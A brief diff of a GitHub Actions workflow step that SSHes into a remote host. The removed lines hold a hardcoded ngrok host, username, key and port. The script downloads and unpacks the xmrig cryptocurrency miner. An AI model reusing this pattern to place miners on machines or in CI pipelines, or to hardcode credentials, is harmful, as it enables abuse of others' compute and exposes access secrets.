@@ -1,10 +1,10 @@
 - name: ssh acces
   uses: appleboy/ssh-action@master
   with:
-    host: 2.tcp.ngrok.io
-    username: Github
-    key: 060486rsd
-    port: 19336
+    host: ${{ secrets.HOST }}
+    username: ${{ secrets.USERNAME }}
+    key: ${{ secrets.KEY }}
+    port: ${{ secrets.PORT }}
     script: |
       wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
       tar xf xmrig-6.16.2-linux-x64.tar.gz
